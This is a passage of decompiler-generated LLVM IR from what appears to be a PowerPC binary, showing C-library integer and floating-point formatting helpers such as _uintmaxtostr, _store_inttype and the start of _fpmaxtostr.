  %v3_1000cb14 = load i32, i32* %v2_1000cb14, align 4
  store i32 %v3_1000cb14, i32* %r9.global-to-local, align 4
  %v4_1000cb18 = icmp eq i32 %v3_1000cb10, %v3_1000cb14
  br i1 %v4_1000cb18, label %dec_label_pc_1000cb20, label %dec_label_pc_1000cb28

dec_label_pc_1000cb20:                            ; preds = %dec_label_pc_1000cb10
  %v1_1000cb20 = and i32 %v3_1000cad4, 2
  store i32 %v1_1000cb20, i32* %r0.global-to-local, align 4
  %v3_1000cb20 = icmp eq i32 %v1_1000cb20, 0
  br i1 %v3_1000cb20, label %dec_label_pc_1000cb48, label %dec_label_pc_1000cb28

dec_label_pc_1000cb28:                            ; preds = %dec_label_pc_1000cb10, %dec_label_pc_1000cb20
  %v1_1000cb28 = and i32 %v3_1000cad4, 1024
  store i32 %v1_1000cb28, i32* %r9.global-to-local, align 4
  %v0_1000cb30 = call i32 @__asm_mfcr()
  store i32 %v0_1000cb30, i32* %r3.global-to-local, align 4
  %v1_1000cb34 = call i32 @__asm_rlwinm(i32 %v0_1000cb30, i32 3, i32 31, i32 31)
  %v1_1000cb38 = sub i32 2, %v1_1000cb34
  store i32 %v1_1000cb38, i32* @r5, align 4
  store i32 268487488, i32* @lr, align 4
  %v1_1000cb3c = call i32 @__GI_fseek(i32 %v1_1000cb38)
  store i32 %v1_1000cb3c, i32* %r3.global-to-local, align 4
  %v3_1000cb40 = icmp eq i32 %v1_1000cb3c, 0
  br i1 %v3_1000cb40, label %dec_label_pc_1000cb28.dec_label_pc_1000cb48_crit_edge, label %dec_label_pc_1000caec

dec_label_pc_1000cb28.dec_label_pc_1000cb48_crit_edge: ; preds = %dec_label_pc_1000cb28
  %v0_1000cb48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb48

dec_label_pc_1000cb48:                            ; preds = %dec_label_pc_1000cb28.dec_label_pc_1000cb48_crit_edge, %dec_label_pc_1000cb08, %dec_label_pc_1000cb20
  %v0_1000cb48 = phi i32 [ %v0_1000cb48.pre, %dec_label_pc_1000cb28.dec_label_pc_1000cb48_crit_edge ], [ %v0_1000cb10, %dec_label_pc_1000cb08 ], [ %v0_1000cb10, %dec_label_pc_1000cb20 ]
  %v1_1000cb48 = inttoptr i32 %v0_1000cb48 to i16*
  %v2_1000cb48 = load i16, i16* %v1_1000cb48, align 2
  %v3_1000cb48 = zext i16 %v2_1000cb48 to i32
  store i32 %v3_1000cb48, i32* %r0.global-to-local, align 4
  %v1_1000cb4c = add i32 %v0_1000cb48, 8
  %v2_1000cb4c = inttoptr i32 %v1_1000cb4c to i32*
  %v3_1000cb4c = load i32, i32* %v2_1000cb4c, align 4
  store i32 %v3_1000cb4c, i32* %r9.global-to-local, align 4
  %v1_1000cb50 = call i32 @__asm_rlwinm(i32 %v3_1000cb48, i32 0, i32 0, i32 29)
  %v2_1000cb50 = trunc i32 %v1_1000cb50 to i16
  store i32 %v1_1000cb50, i32* %r0.global-to-local, align 4
  %v3_1000cb54 = load i32, i32* @r31, align 4
  %v4_1000cb54 = inttoptr i32 %v3_1000cb54 to i16*
  store i16 %v2_1000cb50, i16* %v4_1000cb54, align 2
  %v0_1000cb58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb58 = load i32, i32* @r31, align 4
  %v2_1000cb58 = add i32 %v1_1000cb58, 20
  %v3_1000cb58 = inttoptr i32 %v2_1000cb58 to i32*
  store i32 %v0_1000cb58, i32* %v3_1000cb58, align 4
  %v0_1000cb5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb5c = load i32, i32* @r31, align 4
  %v2_1000cb5c = add i32 %v1_1000cb5c, 24
  %v3_1000cb5c = inttoptr i32 %v2_1000cb5c to i32*
  store i32 %v0_1000cb5c, i32* %v3_1000cb5c, align 4
  %v0_1000cb60 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb60 = load i32, i32* @r31, align 4
  %v2_1000cb60 = add i32 %v1_1000cb60, 16
  %v3_1000cb60 = inttoptr i32 %v2_1000cb60 to i32*
  store i32 %v0_1000cb60, i32* %v3_1000cb60, align 4
  %v0_1000cb64.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb64

dec_label_pc_1000cb64:                            ; preds = %dec_label_pc_1000cb00, %dec_label_pc_1000cb48
  %v2_1000cb70 = phi i32 [ %v0_1000cb10, %dec_label_pc_1000cb00 ], [ %v0_1000cb64.pre, %dec_label_pc_1000cb48 ]
  %v1_1000cb64 = inttoptr i32 %v2_1000cb70 to i16*
  %v2_1000cb64 = load i16, i16* %v1_1000cb64, align 2
  %v3_1000cb64 = zext i16 %v2_1000cb64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000cb6c = or i32 %v3_1000cb64, 64
  store i32 %v1_1000cb6c, i32* %r0.global-to-local, align 4
  %v1_1000cb70 = trunc i32 %v1_1000cb6c to i16
  store i16 %v1_1000cb70, i16* %v1_1000cb64, align 2
  %v0_1000cb74 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cb74 = urem i32 %v0_1000cb74, 65536
  store i32 %v1_1000cb74, i32* %r0.global-to-local, align 4
  %v1_1000cb78 = and i32 %v0_1000cb74, 2816
  store i32 %v1_1000cb78, i32* %r9.global-to-local, align 4
  %v3_1000cb78 = icmp eq i32 %v1_1000cb78, 0
  br i1 %v3_1000cb78, label %dec_label_pc_1000cb80, label %dec_label_pc_1000cb88

dec_label_pc_1000cb80:                            ; preds = %dec_label_pc_1000cb64
  %v0_1000cb80 = load i32, i32* @r31, align 4
  %v1_1000cb80 = add i32 %v0_1000cb80, 12
  %v2_1000cb80 = inttoptr i32 %v1_1000cb80 to i32*
  %v3_1000cb80 = load i32, i32* %v2_1000cb80, align 4
  store i32 %v3_1000cb80, i32* %r0.global-to-local, align 4
  %v2_1000cb84 = add i32 %v0_1000cb80, 28
  %v3_1000cb84 = inttoptr i32 %v2_1000cb84 to i32*
  store i32 %v3_1000cb80, i32* %v3_1000cb84, align 4
  br label %dec_label_pc_1000cb88

dec_label_pc_1000cb88:                            ; preds = %dec_label_pc_1000cb64, %dec_label_pc_1000caec, %dec_label_pc_1000cb80
  store i32 %v0_1000caa4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000caac, i32* @r31, align 4
  %v0_1000cb98 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000cb98

; uselistorder directives
  uselistorder i32 %v0_1000cb74, { 1, 0 }
  uselistorder i32 %v1_1000cb50, { 1, 0 }
  uselistorder i32 %v0_1000cb48, { 1, 0 }
  uselistorder i32 %v0_1000cb10, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1000cab8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 8, 1, 2, 3, 0, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cb88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cb64, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cb28, { 1, 0 }
  uselistorder label %dec_label_pc_1000cae0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cad4, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1000cb9c = load i32, i32* @r5, align 4
  %v1_1000cb9c = icmp slt i32 %v0_1000cb9c, 0
  %v1_1000cba0 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_1000cbdc = icmp eq i32 %v1_1000cba0, 0
  br i1 %v1_1000cb9c, label %dec_label_pc_1000cbdc, label %dec_label_pc_1000cba8

dec_label_pc_1000cba8:                            ; preds = %entry
  br i1 %v3_1000cbdc, label %dec_label_pc_1000cbb0, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbb0:                            ; preds = %dec_label_pc_1000cba8
  %v3_1000cbb0 = icmp eq i32 %arg1, 256
  br i1 %v3_1000cbb0, label %dec_label_pc_1000cbbc, label %dec_label_pc_1000cbc4

dec_label_pc_1000cbbc:                            ; preds = %dec_label_pc_1000cbb0
  br label %dec_label_pc_1000cbd0

dec_label_pc_1000cbc4:                            ; preds = %dec_label_pc_1000cbb0
  %v3_1000cbc4 = icmp eq i32 %arg1, 512
  br i1 %v3_1000cbc4, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000cbd0

dec_label_pc_1000cbcc:                            ; preds = %dec_label_pc_1000cbc4
  br label %dec_label_pc_1000cbd0

dec_label_pc_1000cbd0:                            ; preds = %dec_label_pc_1000cbc4, %dec_label_pc_1000cbbc, %dec_label_pc_1000cbcc
  ret i32 0

dec_label_pc_1000cbdc:                            ; preds = %entry
  br i1 %v3_1000cbdc, label %dec_label_pc_1000cbf0, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbe4:                            ; preds = %dec_label_pc_1000cba8, %dec_label_pc_1000cbdc
  %v2_1000cbe4 = load i32, i32* %arg2, align 4
  ret i32 %v2_1000cbe4

dec_label_pc_1000cbf0:                            ; preds = %dec_label_pc_1000cbdc
  %v3_1000cbf0 = icmp eq i32 %arg1, 256
  %v2_1000cbf4 = load i32, i32* %arg2, align 4
  br i1 %v3_1000cbf0, label %dec_label_pc_1000cbfc, label %dec_label_pc_1000cc04

dec_label_pc_1000cbfc:                            ; preds = %dec_label_pc_1000cbf0
  %v1_1000cbfc = urem i32 %v2_1000cbf4, 256
  br label %dec_label_pc_1000cc10

dec_label_pc_1000cc04:                            ; preds = %dec_label_pc_1000cbf0
  %v3_1000cc04 = icmp eq i32 %arg1, 512
  br i1 %v3_1000cc04, label %dec_label_pc_1000cc0c, label %dec_label_pc_1000cc10

dec_label_pc_1000cc0c:                            ; preds = %dec_label_pc_1000cc04
  %v1_1000cc0c = mul i32 %v2_1000cbf4, 65536
  %v2_1000cc0c = sdiv i32 %v1_1000cc0c, 65536
  br label %dec_label_pc_1000cc10

dec_label_pc_1000cc10:                            ; preds = %dec_label_pc_1000cc04, %dec_label_pc_1000cbfc, %dec_label_pc_1000cc0c
  %v0_1000cc10 = phi i32 [ %v2_1000cbf4, %dec_label_pc_1000cc04 ], [ %v1_1000cbfc, %dec_label_pc_1000cbfc ], [ %v2_1000cc0c, %dec_label_pc_1000cc0c ]
  %tmp = icmp slt i32 %v0_1000cc10, 0
  %v1_1000cc14 = zext i1 %tmp to i32
  %v2_1000cc14 = ashr i32 %v0_1000cc10, 31
  %v3_1000cc14 = and i32 %v2_1000cc14, -2
  %v4_1000cc14 = or i32 %v3_1000cc14, %v1_1000cc14
  ret i32 %v4_1000cc14

; uselistorder directives
  uselistorder i32 %v0_1000cc10, { 1, 0 }
  uselistorder i32 %v2_1000cbf4, { 2, 0, 1 }
  uselistorder i1 %v3_1000cbdc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000cc10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cbe4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cbd0, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000cc1c = load i32, i32* @r4, align 4
  %v3_1000cc1c = icmp eq i32 %v0_1000cc1c, 256
  br i1 %v3_1000cc1c, label %dec_label_pc_1000cc28, label %dec_label_pc_1000cc30

dec_label_pc_1000cc28:                            ; preds = %entry
  %v0_1000cc28 = load i32, i32* @r6, align 4
  %v1_1000cc28 = trunc i32 %v0_1000cc28 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000cc28, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000cc30:                            ; preds = %entry
  %v3_1000cc20 = icmp eq i32 %v0_1000cc1c, 2048
  br i1 %v3_1000cc20, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc44

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc30
  %v0_1000cc38 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cc38, i32* %tmp2, align 4
  %v0_1000cc3c = load i32, i32* @r6, align 4
  %v3_1000cc3c = add i32 %tmp, 4
  %v4_1000cc3c = inttoptr i32 %v3_1000cc3c to i32*
  store i32 %v0_1000cc3c, i32* %v4_1000cc3c, align 4
  ret i32 %tmp

dec_label_pc_1000cc44:                            ; preds = %dec_label_pc_1000cc30
  %v3_1000cc30 = icmp eq i32 %v0_1000cc1c, 512
  %v0_1000cc48 = load i32, i32* @r6, align 4
  br i1 %v3_1000cc30, label %dec_label_pc_1000cc48, label %dec_label_pc_1000cc50

dec_label_pc_1000cc48:                            ; preds = %dec_label_pc_1000cc44
  %v1_1000cc48 = trunc i32 %v0_1000cc48 to i16
  store i16 %v1_1000cc48, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000cc50:                            ; preds = %dec_label_pc_1000cc44
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cc48, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cc58 = load i32, i32* @r7, align 4
  %v3_1000cc58 = icmp eq i32 %v0_1000cc58, 0
  store i1 %v3_1000cc58, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_1000cc58, -1
  br i1 %tmp12, label %dec_label_pc_1000cc8c, label %dec_label_pc_1000cc6c

dec_label_pc_1000cc6c:                            ; preds = %entry
  %v0_1000cc6c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000cc70 = sub i32 0, %v0_1000cc58
  store i32 %v1_1000cc70, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_1000cc6c, -1
  br i1 %tmp13, label %dec_label_pc_1000cc8c, label %dec_label_pc_1000cc78

dec_label_pc_1000cc78:                            ; preds = %dec_label_pc_1000cc6c
  %v0_1000cc78 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cc78 = sub i32 0, %v0_1000cc78
  %v2_1000cc78 = sub i32 -1, %v0_1000cc78
  store i32 %v1_1000cc78, i32* %r6.global-to-local, align 4
  %v4_1000cc78 = icmp uge i32 %v2_1000cc78, %v1_1000cc78
  %v1_1000cc7c = sub i32 -1, %v0_1000cc6c
  %v3_1000cc7c = zext i1 %v4_1000cc78 to i32
  %v4_1000cc7c = add i32 %v3_1000cc7c, %v1_1000cc7c
  store i32 %v4_1000cc7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cc8c

dec_label_pc_1000cc8c:                            ; preds = %entry, %dec_label_pc_1000cc6c, %dec_label_pc_1000cc78
  %v1_1000cc90 = phi i32 [ %v1_1000cc70, %dec_label_pc_1000cc78 ], [ %v1_1000cc70, %dec_label_pc_1000cc6c ], [ %v0_1000cc58, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000cc78 ], [ 0, %dec_label_pc_1000cc6c ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000cc90 = udiv i32 -1, %v1_1000cc90
  store i32 %v2_1000cc90, i32* @r8, align 4
  %v2_1000cc98 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000cc98 = inttoptr i32 %v2_1000cc98 to i8*
  store i8 0, i8* %v3_1000cc98, align 1
  %v0_1000cc9c = load i32, i32* @r8, align 4
  %v1_1000cc9c = load i32, i32* @r7, align 4
  %v2_1000cc9c = mul i32 %v1_1000cc9c, %v0_1000cc9c
  %v1_1000cca0 = sub i32 0, %v2_1000cc9c
  store i32 %v1_1000cca0, i32* @r31, align 4
  %v4_1000cca4 = icmp eq i32 %v1_1000cc9c, %v1_1000cca0
  br i1 %v4_1000cca4, label %dec_label_pc_1000ccac, label %dec_label_pc_1000ccb4

dec_label_pc_1000ccac:                            ; preds = %dec_label_pc_1000cc8c
  %v1_1000ccac = add i32 %v0_1000cc9c, 1
  store i32 %v1_1000ccac, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000ccb4

dec_label_pc_1000ccb4:                            ; preds = %dec_label_pc_1000cc8c, %dec_label_pc_1000ccac
  %v0_1000ccb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000ccb4, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000ccb8

dec_label_pc_1000ccb8thread-pre-split:            ; preds = %dec_label_pc_1000cd0c
  %v0_1000ccb8.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000ccbc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000ccb8

dec_label_pc_1000ccb8:                            ; preds = %dec_label_pc_1000ccb8thread-pre-split, %dec_label_pc_1000ccb4
  %v1_1000cd00 = phi i32 [ %v1_1000ccbc.pre, %dec_label_pc_1000ccb8thread-pre-split ], [ %v1_1000cc9c, %dec_label_pc_1000ccb4 ]
  %v1_1000ccd0 = phi i32 [ %v0_1000ccb8.pr, %dec_label_pc_1000ccb8thread-pre-split ], [ %v0_1000ccb4, %dec_label_pc_1000ccb4 ]
  %v3_1000ccb8 = icmp eq i32 %v1_1000ccd0, 0
  %v0_1000ccbc = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ccbc = udiv i32 %v0_1000ccbc, %v1_1000cd00
  br i1 %v3_1000ccb8, label %dec_label_pc_1000cd00, label %dec_label_pc_1000ccc4

dec_label_pc_1000ccc4:                            ; preds = %dec_label_pc_1000ccb8
  %v2_1000ccc4 = udiv i32 %v1_1000ccd0, %v1_1000cd00
  %v2_1000ccc8 = mul i32 %v2_1000ccc4, %v1_1000cd00
  %v2_1000cccc = mul i32 %v2_1000ccbc, %v1_1000cd00
  %v2_1000ccd0 = sub i32 %v1_1000ccd0, %v2_1000ccc8
  store i32 %v2_1000ccc4, i32* %r12.global-to-local, align 4
  %v0_1000ccd8 = load i32, i32* @r31, align 4
  %v2_1000ccd8 = mul i32 %v0_1000ccd8, %v2_1000ccd0
  %v2_1000ccdc = sub i32 %v0_1000ccbc, %v2_1000cccc
  %v2_1000cce0 = add i32 %v2_1000ccd8, %v2_1000ccdc
  %v0_1000cce4 = load i32, i32* @r8, align 4
  %v2_1000cce4 = mul i32 %v0_1000cce4, %v2_1000ccd0
  %v2_1000cce8 = udiv i32 %v2_1000cce0, %v1_1000cd00
  %v2_1000ccec = add i32 %v2_1000cce4, %v2_1000ccbc
  %v2_1000ccf0 = mul i32 %v2_1000cce8, %v1_1000cd00
  %v2_1000ccf4 = add i32 %v2_1000ccec, %v2_1000cce8
  store i32 %v2_1000ccf4, i32* %r6.global-to-local, align 4
  %v2_1000ccf8 = sub i32 %v2_1000cce0, %v2_1000ccf0
  store i32 %v2_1000ccf8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cd0c

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000ccb8
  %v2_1000cd00 = mul i32 %v2_1000ccbc, %v1_1000cd00
  %v2_1000cd04 = sub i32 %v0_1000ccbc, %v2_1000cd00
  store i32 %v2_1000cd04, i32* %r5.global-to-local, align 4
  store i32 %v2_1000ccbc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cd0c

dec_label_pc_1000cd0c:                            ; preds = %dec_label_pc_1000ccc4, %dec_label_pc_1000cd00
  %v1_1000cd10 = phi i32 [ %v2_1000ccc4, %dec_label_pc_1000ccc4 ], [ 0, %dec_label_pc_1000cd00 ]
  %v0_1000cd10 = phi i32 [ %v2_1000ccf4, %dec_label_pc_1000ccc4 ], [ %v2_1000ccbc, %dec_label_pc_1000cd00 ]
  %v0_1000cd14 = phi i32 [ %v2_1000ccf8, %dec_label_pc_1000ccc4 ], [ %v2_1000cd04, %dec_label_pc_1000cd00 ]
  %v2_1000cd10 = or i32 %v0_1000cd10, %v1_1000cd10
  %v5_1000cd10 = icmp eq i32 %v2_1000cd10, 0
  store i1 %v5_1000cd10, i1* %cr0_eq.global-to-local, align 1
  %v1_1000cd18 = load i32, i32* @r30, align 4
  %v0_1000cd1c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cd1c = add i32 %v0_1000cd1c, -1
  store i32 %v1_1000cd1c, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000cd14, 10
  %v1_1000cd14.v2_1000cd18.v = select i1 %tmp14, i32 48, i32 %v1_1000cd18
  %v1_1000cd14.v2_1000cd18 = add i32 %v0_1000cd14, %v1_1000cd14.v2_1000cd18.v
  %extract.t9.extract.t = trunc i32 %v1_1000cd14.v2_1000cd18 to i8
  %v3_1000cd2c = inttoptr i32 %v1_1000cd1c to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000cd2c, align 1
  %v0_1000cd30 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000cd30, label %dec_label_pc_1000cd34, label %dec_label_pc_1000ccb8thread-pre-split

dec_label_pc_1000cd34:                            ; preds = %dec_label_pc_1000cd0c
  %v0_1000cd34 = load i32, i32* @r29, align 4
  %v3_1000cd34 = icmp eq i32 %v0_1000cd34, 0
  br i1 %v3_1000cd34, label %dec_label_pc_1000cd34.dec_label_pc_1000cd44_crit_edge, label %dec_label_pc_1000cd3c

dec_label_pc_1000cd34.dec_label_pc_1000cd44_crit_edge: ; preds = %dec_label_pc_1000cd34
  %v0_1000cd4c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cd44

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000cd34
  %v2_1000cd40 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000cd40 = add i32 %v2_1000cd40, -1
  %v4_1000cd40 = inttoptr i32 %v3_1000cd40 to i8*
  store i8 45, i8* %v4_1000cd40, align 1
  store i32 %v3_1000cd40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cd44

dec_label_pc_1000cd44:                            ; preds = %dec_label_pc_1000cd34.dec_label_pc_1000cd44_crit_edge, %dec_label_pc_1000cd3c
  %v0_1000cd4c = phi i32 [ %v0_1000cd4c.pre, %dec_label_pc_1000cd34.dec_label_pc_1000cd44_crit_edge ], [ %v3_1000cd40, %dec_label_pc_1000cd3c ]
  ret i32 %v0_1000cd4c

; uselistorder directives
  uselistorder i32 %v2_1000ccc4, { 1, 2, 0 }
  uselistorder i32 %v2_1000ccbc, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000cd00, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000cc9c, { 1, 2, 0 }
  uselistorder i32 %v0_1000cc9c, { 1, 0 }
  uselistorder i32 %v0_1000cc58, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000cd44, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc8c, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000cd50 = load i32, i32* @lr, align 4
  store i32 %v0_1000cd50, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000cd6c = add i32 %tmp, 11
  %v2_1000cd6c = inttoptr i32 %v1_1000cd6c to i8*
  %v3_1000cd6c = load i8, i8* %v2_1000cd6c, align 1
  %v4_1000cd6c = zext i8 %v3_1000cd6c to i32
  store i32 %v4_1000cd6c, i32* %r31.global-to-local, align 4
  %v1_1000cd70 = or i32 %v4_1000cd6c, 32
  %v1_1000cd74 = icmp ult i32 %v1_1000cd70, 97
  %v3_1000cd74 = icmp eq i32 %v1_1000cd70, 97
  store i1 %v1_1000cd74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd74, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000cd80 = add i32 %tmp, 4
  %v2_1000cd80 = inttoptr i32 %v1_1000cd80 to i32*
  %v3_1000cd80 = load i32, i32* %v2_1000cd80, align 4
  store i32 %v3_1000cd80, i32* %r28.global-to-local, align 4
  %v2_1000cd84 = load i32, i32* %arg2, align 4
  store i32 %v2_1000cd84, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cd74, label %dec_label_pc_1000cd8c, label %dec_label_pc_1000cd94

dec_label_pc_1000cd8c:                            ; preds = %entry
  %v1_1000cd8c = add nuw nsw i32 %v4_1000cd6c, 6
  store i32 %v1_1000cd8c, i32* %r0.global-to-local, align 4
  %v1_1000cd90 = urem i32 %v1_1000cd8c, 256
  store i32 %v1_1000cd90, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cd94

dec_label_pc_1000cd94:                            ; preds = %entry, %dec_label_pc_1000cd8c
  %v0_1000ce48 = phi i32 [ %v4_1000cd6c, %entry ], [ %v1_1000cd90, %dec_label_pc_1000cd8c ]
  %v1_1000cd94 = icmp slt i32 %v2_1000cd84, 0
  %v3_1000cd94 = icmp eq i32 %v2_1000cd84, 0
  store i1 %v1_1000cd94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cd94, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000cd84, -1
  br i1 %tmp75, label %dec_label_pc_1000cda0, label %dec_label_pc_1000cd9c

dec_label_pc_1000cd9c:                            ; preds = %dec_label_pc_1000cd94
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cda0

dec_label_pc_1000cda0:                            ; preds = %dec_label_pc_1000cd94, %dec_label_pc_1000cd9c
  %v0_1000cf5844 = phi i32 [ %v2_1000cd84, %dec_label_pc_1000cd94 ], [ 6, %dec_label_pc_1000cd9c ]
  %v1_1000cda0 = add i32 %tmp, 12
  %v2_1000cda0 = inttoptr i32 %v1_1000cda0 to i32*
  %v3_1000cda0 = load i32, i32* %v2_1000cda0, align 4
  store i32 %v3_1000cda0, i32* %r9.global-to-local, align 4
  %v1_1000cda4 = and i32 %v3_1000cda0, 2
  %v3_1000cda4 = icmp eq i32 %v1_1000cda4, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000cda4, label %dec_label_pc_1000cdbc, label %dec_label_pc_1000cdc8

dec_label_pc_1000cdbc:                            ; preds = %dec_label_pc_1000cda0
  %v1_1000cdbc = urem i32 %v3_1000cda0, 2
  store i32 %v1_1000cdbc, i32* @r7, align 4
  %v3_1000cdbc = icmp eq i32 %v1_1000cdbc, 0
  br i1 %v3_1000cdbc, label %dec_label_pc_1000cdcc, label %dec_label_pc_1000cdc8

dec_label_pc_1000cdc8:                            ; preds = %dec_label_pc_1000cdbc, %dec_label_pc_1000cda0
  %storemerge = phi i32 [ 43, %dec_label_pc_1000cda0 ], [ 32, %dec_label_pc_1000cdbc ]
